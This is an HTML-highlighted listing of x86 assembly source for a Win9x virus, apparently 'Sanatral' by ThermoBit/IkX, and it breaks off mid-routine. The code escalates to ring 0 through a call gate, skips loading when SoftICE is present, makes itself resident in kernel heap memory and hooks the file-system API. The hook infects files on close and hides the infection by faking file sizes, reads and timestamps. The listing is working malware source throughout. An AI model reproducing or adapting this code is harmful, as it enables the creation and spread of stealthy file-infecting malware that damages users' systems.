</span><span class="sc5">szIDString</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"[Sanatral."</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc4">/</span><span class="sc2">1000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">vsize</span><span class="sc4">/</span><span class="sc2">100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">vsize</span><span class="sc4">/</span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc3">"0"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">vsize</span><span class="sc4">/</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc3">"0"</span><span class="sc4">,</span><span class="sc3">" by ThermoBit/IkX,y2K]"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


    </span><span class="sc1">;/* Header encryption (for the CODE section loader) 32-bit simple */</span><span class="sc0">

</span><span class="sc5">TopCryptEnc</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loader</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoaderBuffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">patchsize</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">TopCrypt</span><span class="sc4">-</span><span class="sc5">loader</span><span class="sc4">)+((</span><span class="sc5">TopCryptSize</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">)-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TopCryptKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">TopCryptSize</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">TopCryptEncLoop</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">

</span><span class="sc5">enc_algo</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">TopCryptEncLoop</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


    </span><span class="sc1">;/* 32-bit simple top-layer encryption */</span><span class="sc0">

</span><span class="sc5">SimpleCrypt</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">lsize</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MainTopLayerKey</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">enc5</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc5">simple_enc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">enc5</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*********************************************************</span><span class="sc0">
</span><span class="sc1">;*                           *</span><span class="sc0">
</span><span class="sc1">;* &lt;Win9x&gt; driver memory installation            *</span><span class="sc0">
</span><span class="sc1">;*********************************************************</span><span class="sc0">

</span><span class="sc5">install</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sldt</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">NT</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">111b</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@@4</span><span class="sc0">
</span><span class="sc5">NT</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc1">;/* Switch application mode to Vxd driver using LDT */</span><span class="sc0">

</span><span class="sc5">@@@3</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sgdt</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; EDX = GDT base address</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">CallGateSelector</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0EC000000h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">shld</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09Ah</span><span class="sc0">                </span><span class="sc1">; call Ring0_CS:ESI</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">CallGateSelector</span><span class="sc4">+</span><span class="sc2">111b</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; return to host</span><span class="sc0">
</span><span class="sc5">@@@4</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@@3</span><span class="sc0">
        </span><span class="sc6">pushfd</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">202h</span><span class="sc0">
        </span><span class="sc5">VxdCall</span><span class="sc0"> </span><span class="sc5">VMM_Get_DDB</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; Check for SoftIce</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">back_ring3</span><span class="sc0">          </span><span class="sc1">; don't load under softice</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">dr1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'grrr'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">back_ring3</span><span class="sc0">          </span><span class="sc1">; assume already resident</span><span class="sc0">



        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_r0_delta</span><span class="sc0">
</span><span class="sc5">get_r0_delta</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">get_r0_delta</span><span class="sc0">




        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">mem_vsize</span><span class="sc0">           </span><span class="sc1">; size of memory block needed</span><span class="sc0">
        </span><span class="sc5">VxdCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_GetHeap</span><span class="sc0">          </span><span class="sc1">; allocate our TSR memory</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; ECX = nr. of bytes to copy (fix stack)</span><span class="sc0">

    </span><span class="sc1">;/* Copy virus into windoze memory */</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; source: start of virus code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; destination (IFSMgr heap memory)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; copy virus to allocated memory</span><span class="sc0">

    </span><span class="sc1">;/* Install our FileSystem API hook */</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc5">IFSHook</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; edi holds difference from base addr. to hook addr.</span><span class="sc0">
        </span><span class="sc6">xadd</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; EAX = pointer to our hook, EDI = pointer to our memory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; address of our hook</span><span class="sc0">
        </span><span class="sc5">VxdCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_InstallFileSystemApiHook</span><span class="sc0"> </span><span class="sc1">; install our API hook, EAX = next hook handler</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; fix stack (damn vxds)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; get address from entry</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">NextIFSHook</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">)],</span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; store next hook address in our hook handler's code</span><span class="sc0">

</span><span class="sc1">;       mov eax,13h</span><span class="sc0">
</span><span class="sc1">;       lea esi,[ebp+Disk_Access_Hook]</span><span class="sc0">
</span><span class="sc1">;       VxdCall VMM_Hook_V86_Int_Chain</span><span class="sc0">

    </span><span class="sc1">;/* Mark us resident and return */</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'grrr'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr1</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">back_ring3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popfd</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">


</span><span class="sc1">;********************************************************</span><span class="sc0">
</span><span class="sc1">;*                          *</span><span class="sc0">
</span><span class="sc1">;* Win9x file system API hook. calls the apropiate  *</span><span class="sc0">
</span><span class="sc1">;* handlers for interresting calls          *</span><span class="sc0">
</span><span class="sc1">;********************************************************</span><span class="sc0">


</span><span class="sc5">IFSHook</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">NextIFSHook</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">dr0</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'BUSY'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">next_no_topchn</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hook_delta</span><span class="sc0">
</span><span class="sc5">hook_delta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hook_delta</span><span class="sc0">       </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">esi.FSDFnAddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">esi.ptrToIOREQ</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.ir_error</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; check for errors</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">next_no_topchn</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'BUSY'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.FunctionNum</span><span class="sc4">]</span><span class="sc0">


    </span><span class="sc1">;/* Intercept following functionz */</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">           </span><span class="sc1">; modify open mode (r/w)</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">FileOpen</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_CLOSE</span><span class="sc0">          </span><span class="sc1">; infect file (while still open)</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">FileClose</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_READ</span><span class="sc0">           </span><span class="sc1">; stealthn virus data</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">FileRead</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_WRITE</span><span class="sc0">          </span><span class="sc1">; get FSD function for file writing..</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">FileWrite</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_SEEK</span><span class="sc0">           </span><span class="sc1">; manipulate seek so end of file will be original end</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">SeekFile</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_FINDOPEN</span><span class="sc0">       </span><span class="sc1">; show original filesize</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">FindFile</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_FINDNEXT</span><span class="sc0">       </span><span class="sc1">; show original filesize</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">FindFile</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_ENUMHANDLE</span><span class="sc0">     </span><span class="sc1">; return original filesize</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">EnumHandle</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IFSFN_FILETIMES</span><span class="sc0">      </span><span class="sc1">; store FileTimes FSD for filetime stealth</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">FileTime</span><span class="sc0">



</span><span class="sc5">next_ifs_hook</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; mark virus inactive in debug register</span><span class="sc0">
</span><span class="sc5">next_no_topchn</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">; restore registers</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; jmp to next handler in the IFS chain, we're out!</span><span class="sc0">
</span><span class="sc5">exit_ifs_hook</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">; Return hook without passing control</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">next_hooker</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">; Calls the next IFSMgr API hooker in chain</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.ptrToIOREQ</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.CodePage</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.ResourceFlags</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.Drive</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.FunctionNum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.FSDFnAddr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NextIFSHook</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*********************************************************</span><span class="sc0">
</span><span class="sc1">;*                           *</span><span class="sc0">
</span><span class="sc1">;* Make sure no attempts to read after original end of   *</span><span class="sc0">
</span><span class="sc1">;* file succeeds, stealthn sensetive data...         *</span><span class="sc0">
</span><span class="sc1">;*********************************************************</span><span class="sc0">


</span><span class="sc5">FileRead</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fsd_read</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fsd_seek</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">next_ifs_hook</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seek_ioreq</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ESI points to ioreq structure, EDI to our buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">ioreq</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.ir_flags</span><span class="sc4">],</span><span class="sc5">FILE_END</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.ir_pos</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; seek to end of file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">esi.ir_error</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; check for errors</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ifs_hook</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.ir_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">next_ifs_hook</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">file_align</span><span class="sc0">          </span><span class="sc1">; aligned right?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ifs_hook</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileBuffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkfile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">next_ifs_hook</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.ir_pos</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; ecx = position reading from</span><span class="sc0">
